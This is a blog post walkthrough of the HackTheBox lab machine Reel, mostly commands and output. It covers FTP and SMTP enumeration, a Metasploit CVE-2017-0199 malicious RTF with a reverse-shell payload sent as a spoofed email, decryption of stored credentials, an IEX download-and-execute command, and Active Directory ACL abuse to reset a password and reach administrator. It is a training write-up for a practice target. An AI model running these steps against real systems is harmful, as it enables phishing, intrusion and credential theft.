---
layout: post
title: "How to hack an active directory"
description: Learn pentesting web from 0 with HackTheBox (Reel).
date:   2019-08-15
image:  "img/PhishingReel.jpg"
tags: ["Impersonation attack", "Hacking Active Directory", "Hacking Windows"]
---

Hello Hackers!!  
Today we will learn a variety of interesting things, all thanks to the HackTheBox machine called [Reel](https://www.hackthebox.eu/home/machines/profile/143).   
Before starting I want to clarify that all my published content is done for educational, informative and ethical purposes.  
I am not responsible for the misuse they may give you.  

# With this tutorial you will learn:  
 - How to perform a simple port scan with Nmap.  
 - How to enumerate the FTP Port  
 - How to enumerate the SMTP Port  
 - How to extract metadata from a file with exiftool  
 - How to perform an attack of Impersonation  
 - How to do a Phishing with an office file **(.RTF)**  
 - How to use Metasploit  
 - How to send emails via SMTP using swaks
 - How to install and use BloodHound  
 - Scanning for Active Directory Privileges & Privileged Accounts

# Hacking [Reel](https://www.hackthebox.eu/home/machines/profile/143)  

In any process to hack or have total control over a server in an unauthorized manner must start with a system enumeration.  
For this we will perform a simple scan with Nmap, in the following way.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # nmap -p- -sC -sV -Pn -oN Reel.nmap 10.10.10.77
Nmap scan report for 10.10.10.77
Host is up (0.021s latency).
Not shown: 65532 filtered ports
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-28-18 11:19PM <DIR> documents
| ftp-syst:
|_ SYST: Windows_NT
22/tcp open ssh OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:
| 2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
| 256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_ 256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp open smtp?
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
| 220 Mail Service ready
| FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
| 220 Mail Service ready
| Hello:
| 220 Mail Service ready
| EHLO Invalid domain address.
| Help:
| 220 Mail Service ready
| DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| SIPOptions:
| 220 Mail Service ready
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49159/tcp open msrpc Microsoft Windows RPC
{% endhighlight %}

With the previous port scan we did with Nmap, we managed to identify the ports 21 (FTP),22 (SSH),25 (SMTP) open.  

## FTP Enumeration (Port 21)  
One of the findings found with the NMAP scan is the access with the user "anonymous" for the FTP service.  
Therefore, we can authenticate about this service and review its content.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # ftp 10.10.10.77
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
{% endhighlight %}

There are a variety of commands available for FTP, the most common are:  

| FTP Command | Description of Command            |
|-------------|-----------------------------------|
| cd          | Change remote working directory   |
| dir         | list contents of remote directory |
| get         | receive file                      |
| ls          | list contents of remote directory |
| mget        | get multiple files                |
| mkdir       | make directory on remote machine  |
| mput        | send multiple files               |
| open        | connect to remote ftp             |
| put         | send one file                     |
| quit        | terminate ftp session and exit    |

We will continue, listing the server files.  

{% highlight bash %}
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
{% endhighlight %}

To download files via FTP, we can execute the following:  

{% highlight bash %}
ftp> prompt
Interactive mode off.
ftp> mget *
local: AppLocker.docx remote: AppLocker.docx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2047 bytes received in 0.10 secs (19.2425 kB/s)
local: readme.txt remote: readme.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
124 bytes received in 0.10 secs (1.1592 kB/s)
local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
14581 bytes received in 0.19 secs (68.8589 kB/s)
{% endhighlight %}

Another way to perform this download would be using the WGET binary.  

{% highlight shell %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # wget -r ftp://10.10.10.77
{% endhighlight %}

The file "Windows Event Forwarding.docx" contained the user email address **nico@megabank.com** in the document’s Creator metadata field which could be viewed using exiftool.  

### Extraction of metadata with exiftool  
ExifTool is a free and open-source software program for reading, writing, and manipulating image, audio, video, and PDF metadata.  
[Article Complete](https://en.wikipedia.org/wiki/ExifTool)  
If you want to know how this tool is installed, I invite you to the next [article](https://hackingprofessional.github.io/Security/Como-extraer-metadatos-de-un-archivo/).  

{% highlight shell %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # exiftool "Windows Event Forwarding.docx"
{% endhighlight %} 

The output of the previous command is as follows:  

{% highlight markdown %}
ExifTool Version Number         : 11.16
File Name                       : Windows Event Forwarding.docx
Directory                       : .
File Size                       : 14 kB
File Modification Date/Time     : 2017:10:31 22:13:00-05:00
File Access Date/Time           : 2019:04:28 10:17:33-05:00
File Inode Change Date/Time     : 2019:04:27 20:52:11-05:00
File Permissions                : rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42
Modify Date                     : 2017:10:31 18:51
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
Characters                      : 1709
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 14
Paragraphs                      : 4
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : 
Links Up To Date                : No
Characters With Spaces          : 2004
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 14.0000
{% endhighlight %} 

The file **"readme.txt"** simply contained:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # cat readme.txt
please email me any rtf format procedures — I’ll review and convert.
new format / converted documents will be saved here.
{% endhighlight %} 

## SMTP Enumeration (Port 25)
For the enumeration of the SMTP service, it is useful to list valid users.  
One way to validate the above is using TELNET.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # telnet 10.10.10.77 25
{% endhighlight %} 

The most common commands for TELNET are the following:  

| SMTP Command | Description of Command                                                                                                                                                                     |
|--------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| HELO         | It’s the first SMTP command: is starts the conversation identifying the sender server and is generally followed by its domain name.                                                        |
| EHLO         | An alternative command to start the conversation, underlying that the server is using the Extended SMTP protocol.                                                                          |
| MAIL FROM    | With this SMTP command the operations begin: the sender states the source email address in the “From” field and actually starts the email transfer.                                        |
| RCPT TO      | It identifies the recipient of the email; if there are more than one, the command is simply repeated address by address.                                                                   |
| DATA         | With the DATA command the email content begins to be transferred; it’s generally followed by a 354 reply code given by the server, giving the permission to start the actual transmission. |
| VRFY         | The server is asked to verify whether a particular email address or username actually exists.                                                                                              |
| QUIT         | It terminates the SMTP conversation.                                                                                                                                                       |

Attempting to verify the **"nico@megabank.com"** email account using the VRFY command over SMTP returned the command was disallowed. However, the RCPT command can be used to enumerate valid email accounts:  

{% highlight markdown %}
Trying 10.10.10.77...
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
HELO anything here
250 Hello.
VRFY nico@megabank.com
502 VRFY disallowed.
MAIL From: <gerh@domain.com>
250 OK
RCPT To: <nico@megabank.com>
250 OK
RCPT To: <gerh@megabank.com>
550 Unknown user
QUIT
221 goodbye
Connection closed by foreign host.
{% endhighlight %} 

Another way to validate this is by using the **smtp-enum-users** tool.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # smtp-user-enum -M RCPT -U users.txt -t 10.10.10.77
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------
Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.txt
Target count ............. 1
Username count ........... 14
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............
######## Scan started at Mon Jun 14 02:34:42 2019 #########
10.10.10.77: reel@htb exists
10.10.10.77: reel@reel.htb exists
10.10.10.77: root@htb exists
10.10.10.77: admin@htb exists
10.10.10.77: administrator@htb exists
10.10.10.77: test@htb exists
10.10.10.77: nico@megabank.com exists
######## Scan completed at Mon Jun 14 02:34:42 2019 #########
8 results.
13 queries in 1 seconds (13.0 queries / sec)
{% endhighlight %} 

Before performing the previous scan, we write a list of possible existing emails.  
The contents of the **users.txt** file are as follows:  

{% highlight markdown %}
reel
reel@htb
reel@reel.htb
root
root@htb
admin
admin@htb
administrator
administrator@htb
test@htb
gerh@megabank.com
htb@metabank.com
nico@megabank.com
{% endhighlight %} 

## Performing a phishing attack  
Email spoofing is when an attacker (cybercriminal) forges an email so that it appears the email has been sent by someone else.  
With the results of the previously performed enumeration we have the following:  
    - An Email account "nico@megabank.com"  
    - An SMTP server running on the host  
    - Someone wants to receive .RTF files  

Performing a search for ways to take advantage of the information collected so far we can find the existence of CVE-2017–0199, which was a critical Zero-Day discovered in April 2017 for Microsoft Office.  
The description of Metasploit for this vulnerability is as follows:  

{% highlight markdown %}
Description: This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution. The flaw exists in how a olelink object can make a http(s) request, and execute hta code in response. This bug was originally seen being exploited in the wild starting in Oct 2016. This module was created by reversing a public malware sample.  
{% endhighlight %} 

Basically this vulnerability leveraged **.rtf** files (some renamed to .doc) which would connect to a remote server (controlled by the attacker) in order to download a file that contains HTML application content, and executes as an .hta file. Because .hta is executable, the attacker gains full code execution on the victim’s machine. This logical bug also gives the attackers the power to bypass any memory-based mitigations developed by Microsoft.  
[Article Complete](https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/critical-office-zero-day-attacks-detected-wild/)  


## Using Metasploit
We will proceed, with the use of the metasploit module for the **CVE-2017–0199**.

{% highlight s %}
msf5 > use exploit/windows/fileformat/office_word_hta 
msf5 exploit(windows/fileformat/office_word_hta) > set SRVHOST 10.10.14.30
SRVHOST => 10.10.14.30
msf5 exploit(windows/fileformat/office_word_hta) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/fileformat/office_word_hta) > set LHOST 10.10.14.30
LHOST => 10.10.14.30
msf5 exploit(windows/fileformat/office_word_hta) > set FILENAME shell.rtf
FILENAME => shell.rtf
msf5 exploit(windows/fileformat/office_word_hta) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.30:4444 
msf5 exploit(windows/fileformat/office_word_hta) > [+] shell.rtf stored at /root/.msf4/local/shell.rtf
[*] Using URL: http://10.10.14.30:8080/default.hta
[*] Server started.
{% endhighlight %} 

This module created the malicious file shell.rtf and placed it in the directory /root/.msf4/local/ while also hosting the .hta file on a web server.  

## Sending emails with documents attached by SMTP using swaks 
The next step is to perform an Impersonation attack.  
We will send an email to nico@megabank.com with the infected document attached.   

Swaks is a featureful, flexible, scriptable, transaction-oriented SMTP test tool written and maintained by John Jetmore.  
[Article Complete](http://www.jetmore.org/john/code/swaks/)  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # swaks --to nico@megabank.com --server 10.10.10.77 --attach /root/.msf4/local/shell.rtf
=== Trying 10.10.10.77:25...
=== Connected to 10.10.10.77.
<-  220 Mail Service ready
 -> EHLO BinaryChaos
<-  250-REEL
<-  250-SIZE 20480000
<-  250-AUTH LOGIN PLAIN
<-  250 HELP
 -> MAIL FROM:<root@BinaryChaos>
<-  250 OK
 -> RCPT TO:<nico@megabank.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Sun, 23 Jun 2019 01:39:27 -0500
 -> To: nico@megabank.com
 -> From: root@BinaryChaos
 -> Subject: test Sun, 23 Jun 2019 01:39:27 -0500
 -> Message-Id: <20190623013927.006682@BinaryChaos>
 -> X-Mailer: swaks v20181104.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_6682"
 -> 
 -> ------=_MIME_BOUNDARY_000_6682
 -> Content-Type: text/plain
 -> 
 -> This is a test mailing
 -> ------=_MIME_BOUNDARY_000_6682
 -> Content-Type: application/octet-stream; name="shell.rtf"
 -> Content-Description: shell.rtf
 -> Content-Disposition: attachment; filename="shell.rtf"
 -> Content-Transfer-Encoding: BASE64
 -> 
 -> e1xydGYxXGFkZWZsYW5nMTAyNVxhbnNpXGFuc2ljcGcxMjUyXHVjMVxhZGVmZjMxNTA3XGRlZmYw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
 -> MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAK
 -> MDEwNTAwMDAwMDAwMDAwMH0Ke1xyZXN1bHQge1xydGxjaFxmY3MxIFxhZjMxNTA3IFxsdHJjaFxm
 -> Y3MwIFxpbnNyc2lkMTk3OTMyNCB9fX19CntcKlxkYXRhc3RvcmUgfQp9Cg==
 -> 
 -> ------=_MIME_BOUNDARY_000_6682--
 -> .
<-  250 Queued (11.891 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
{% endhighlight %} 

After sending our email, we just have to wait for the victim to execute the file and in this way we will obtain RCE.  

<script id="asciicast-253182" src="https://asciinema.org/a/253182.js" async></script>

## Persistence (Nico => Tom)  
The user nico had a file on their desktop named cred.xml which appeared to contain credentials for tom, another user on Reel:  

{% highlight s %}
meterpreter > dir C:\Users\nico\Desktop
Listing: C:\Users\nico\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  1468  fil   2017-10-27 18:59:16 -0500  cred.xml
100666/rw-rw-rw-  282   fil   2017-10-27 17:42:45 -0500  desktop.ini
100444/r--r--r--  32    fil   2017-10-27 18:40:33 -0500  user.txt
100666/rw-rw-rw-  162   fil   2017-10-27 16:34:38 -0500  ~$iledDeliveryNotification.doc

meterpreter > cat cred.xml 
{% endhighlight %} 

The content of the file is:   

{% highlight xml %}
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d2
0f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
{% endhighlight %} 

PowerShell has this object called a PSCredential, which provides a method to store usernames, passwords, and credentials. There’s also two functions, Import-CliXml and Export-CliXml , which are used to save these credentials to and restore them from a file. This file is the output of Export-CliXml.  
In order to interact with the xml file as it is intended, the meterpreter shell must load the PowerShell extension using the command:  

{% highlight s %}
meterpreter > load powershell 
Loading extension powershell...Success.

meterpreter > powershell_shell

PS >
{% endhighlight %} 

To get a plaintext password from the file by loading it with Import-CliXml, and then dumping the results:  

{% highlight powershell %}
PS > $tom=Import-CliXml -Path C:\Users\nico\Desktop\cred.xml
PS > $tom.GetNetworkCredential().Password
1ts-mag1c!!!
{% endhighlight %} 

This plaintext password was used to gain SSH access to Reel as the user TOM.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # ssh tom@10.10.10.77
tom@10.10.10.77  password:
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

tom@REEL C:\Users\tom>whoami
htb\tom
{% endhighlight %} 

## Privilege Escalation via AD (Tom => Claire)
### Enumeration  
In the tom user’s Desktop directory, there was a folder titled **"AD Audit"** containing artifacts from a BloodHound Active Directory audit. This included a version antigua de SharpHound.

{% highlight s %}
C:\users\tom\desktop\AD Audit\BloodHound\Ingestors> dir
    Directory: C:\users\tom\desktop\AD Audit\BloodHound\Ingestors
Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---        11/16/2017  11:50 PM     112225 acls.csv
-a---        10/28/2017   9:50 PM       3549 BloodHound.bin
-a---        10/24/2017   4:27 PM     246489 BloodHound_Old.ps1
-a---        10/24/2017   4:27 PM     568832 SharpHound.exe
-a---        10/24/2017   4:27 PM     636959 SharpHound.ps1
{% endhighlight %} 

## Active Directory Privileged Access
SharpHound allows us to discover hidden dependencies in Active Directory environments and, together with BloodHound, which presents a graphical interface for it, we can easily discover our next step to follow.   
We update [SharpHound.ps1](https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1) to the latest version and upload it to the victim.  
We mount an HTTP server on our attacking machine and serve the updated SharpHound file.  

{% highlight zsh %}
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Ethic4l-Hacking/SERVER_FILE] - [Sun Jun 23, 03:02]
└─[$]> # python3 -m http.server 
Servidor HTTP iniciado en el puerto: http://localhost:8000
{% endhighlight %} 

Then we download it to our compromised machine.  

{% highlight powershell %}
PS C:\Users\tom> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.4:8000/SharpHound.ps1')
{% endhighlight %} 

And now we can run the Invoke-BloodHound function to gather the needed data, but first we’ll need to move to a directory in which we can write without risk of overwriting anything or not having write permissions:

{% highlight powershell %}
PS C:\Users\tom> Invoke-BloodHound -CollectionMethod All
Initializing BloodHound at 3:20 AM on 8/19/2019                                                   
Resolved Collection 
Methods to Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM
Starting Enumeration for HTB.LOCAL
Status: 84 objects enumerated (+84 Infinity/s --- Using 101 MB RAM )
Finished enumeration for HTB.LOCAL in 00:00:00.4372083
0 hosts failed ping. 0 hosts timedout.                                                            

Compressing data to C:\Users\tom\20190819032010_BloodHound.zip.
You can upload this file directly to the UI.   
Finished compressing files!
{% endhighlight %} 

Let’s go big and use -CollectionMethod All since the note.txt file mentioned the default query didn’t find anything, so we’ll need all the data we are able to gather. After some time, the command ends and we see several files were created: .json files, a .bin file and a .zip file. What BloodHound needs is the ZIP file (which contains all the generated JSONs).  
For this we are going to mount an SMB server in our kali to copy our ZIP.  

{% highlight zsh %}
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Ethic4l-Hacking/Operations/Premium/Reel] - [Sun Jun 23, 03:43]
└─[$]> # impacket-smbserver share ./
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.77,53670)
[*] AUTHENTICATE_MESSAGE (HTB\tom,REEL)
[*] User tom\REEL authenticated successfully
[*] tom::HTB:4141414141414141:f32c125f98f07b745854b6fecc485306:0101000000000000002c1abf9f29d50198eb9ab4ce28e01f0000000001001000450056004d00640074004f006b007a0002001000490068004a007800430054004e006f0003001000450056004d00640074004f006b007a0004001000490068004a007800430054004e006f0007000800002c1abf9f29d5010600040002000000080030003000000000000000000000000030000069dbc64191c63e04554ebe76cdc838449ef5e8448f9f556479081efefab5cba80a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0033003000000000000000000000000000
{% endhighlight %} 

To copy files from a windows to an SMB server, we must execute the following:  

{% highlight shell %}
tom@REEL C:\Users\tom>copy 20190623093056_BloodHound.zip \\10.10.14.30\share                   
        1 file(s) copied.
{% endhighlight %} 

### Bloodhound
Bloodhound is a tool to take that analysis I just did in spreadsheets, and visualize it. This one computer had 880 relationships / edges in it’s graph. Imagine what an active directory environment of 300,000 computers would look like. Bloodhound finds paths between two objects in these large environments.  
To install Bloodhound on Kali, you can execute:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # apt install bloodhound
{% endhighlight %} 

After installation, to initialize bloodhound we execute the following:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # neo4j console
Active database: graph.db
Directories in use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
2019-06-23 07:09:18.675+0000 INFO  ======== Neo4j 3.5.3 ========
2019-06-23 07:09:18.708+0000 INFO  Starting...
2019-06-23 07:09:24.362+0000 INFO  Bolt enabled on 127.0.0.1:7687.
2019-06-23 07:09:27.619+0000 INFO  Started.
2019-06-23 07:09:29.944+0000 INFO  Remote interface available at http://localhost:7474/
{% endhighlight %} 

After logging in with the default credentials neo4j:neo4j, We load the  **20190623093056_BloodHound.zip** file from the bloodhound web interface.  

Using the “from” and “to” option in bloodhound, I noticed there is a possible path from Tom to the “backup_admins” group.  We have to pivot to the Claire user. Since Tom owns the Claire user object, it is possible for Tom to take ownership and modify the DACL of the Claire user object. We can abuse this to give Tom permissions to change the password of Claire. To change the DACL we first have to take ownership of the Claire object.

<figure>
  <img src="{{site.baseurl}}/img/BloodHound.gif">
	<figcaption>
    <a href="{{site.baseurl}}/img/BloodHound.gif" title="Analyzing with BloodHound">Analyzing with BloodHound</a>.
  </figcaption>
</figure>

## Escalation Privilege  
### Tom => Claire  

**Concepts Importants!!**
**WriteOwner** : Provides the ability to take ownership of an object. The owner of an object can gain full control rights on the object.  
**GenericWrite** : Provides write access to all properties.  
**WriteDacl** : Provides the ability to modify security on an object which can lead to Full Control of the object.  

To move to the claire account, we will use the WriteOwner permission along with the functionality of PowerView.  
In summary, we must perform the following steps:  
  - 1.) Become owner of claire’s ACL  
  - 2.) Get permissions on that ACL  
  - 3.) Use those permissions to change the password  
To achieve this, we will need PowerView, and PowerShell.  
Fortunately, there’s a copy in **C:\Users\tom\Desktop\AD Audit\BloodHound**, We are going to start powershell and import Powerview.  

{% highlight powershell %}
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound> powershell
Windows PowerShell
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module ‘C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1’
{% endhighlight %} 

**Step 1**  
Next, tom has WriteOwner rights on the claire user object. So set tom as the owner of claire object.  
{% highlight powershell %}
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
{% endhighlight %} 

**Step 2**  
Now that tom is the owner of the claire object, tom can add entries to the ACL. Add an entry giving tom the right to change the password of the claire object.  

{% highlight powershell %}
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=HTB,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=tom)(name=tom)(displayname=tom))))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=HTB,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=claire)(name=claire)(displayname=claire))))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL 'ResetPassword' on CN=Claire
Danes,CN=Users,DC=HTB,DC=LOCAL
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL rights GUID 
'00299570-246d-11d0-a768-00aa006e0529' on CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL
{% endhighlight %}  

**Step 3**  
Change the password of claire:  

{% highlight powershell %}
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $ClairePassword = ConvertTo-SecureString ‘Password1234’ -AsPlainText -Force -Verbose
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity claire -AccountPassword $ClairePassword -Verbose
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'claire'
VERBOSE: [Set-DomainUserPassword] Password for user 'claire' successfully reset 
{% endhighlight %}  

Also, we should add the user Claire to the domain group ‘Backup_Admins’ by using the Add-DomainGroupMember function:  

{% highlight powershell %}
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $Cred = New-Object System.Management.Automation.PSCredential(‘HTB\claire’, $ClairePassword)
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainGroupMember -Identity ‘Backup_Admins’ -Members ‘claire’ -Credential $Cred
{% endhighlight %}  

And now we can use our new credentials to log in through SSH with the user Claire:  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # ssh claire@10.10.10.77
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
claire@REEL C:\Users\claire> 
{% endhighlight %}  

From the analysis before, I know that claire has WriteDacl rights on the Backup_Admins group. I can use that to add her to the group.  

{% highlight powershell %}
claire@REEL C:\Users\claire>net group backup_admins                        
Group name:     Backup_Admins
Comment:
Members:	ranj           
-------------------------------------------------------------------------------     
The command completed successfully.

claire@REEL C:\Users\claire>net group backup_admins claire /add
The command completed successfully.
{% endhighlight %}  

After adding to the "Backup_Admins" group, we can access the **C:\Users\Administrator** folder.  
Among several of its files, we find a script with access credentials to log in with the Administrator user.  

{% highlight powershell %}
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1
# admin password                
$password="Cr4ckMeIfYouC4n!"
{% endhighlight %}  

And ready we have managed to compromise the server Administrator user.  
To validate this, we can use credentials and log in by SSH.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
╰─[:)] # ssh Administrator@10.10.10.77
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
administrator@REEL C:\Users\Administrator> 
{% endhighlight %}  
